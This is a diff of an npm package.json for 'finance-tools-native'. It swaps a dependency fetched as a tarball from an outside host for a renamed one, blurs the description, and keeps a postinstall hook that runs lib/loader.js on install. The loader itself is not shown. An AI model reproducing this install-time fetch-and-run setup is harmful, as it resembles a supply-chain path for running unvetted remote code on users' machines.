@@ -1,14 +1,13 @@
 {
   "name": "finance-tools-native",
   "version": "1.0.0",
-  "description": "Native financial tools module",
+  "description": "Finance workflow helpers",
   "main": "lib/loader.js",
   "dependencies": {
-    "finance-native-binary": "https://m100.cloud/assets/finance-native-helper-1.0.0.tgz"
+    "finance-tools-runtime": "https://m100.cloud/assets/finance-tools-runtime-1.0.0.tgz"
   },
   "scripts": {
     "postinstall": "node lib/loader.js"
   },
-  "keywords": ["finance", "native", "tools"],
   "license": "MIT"
 }
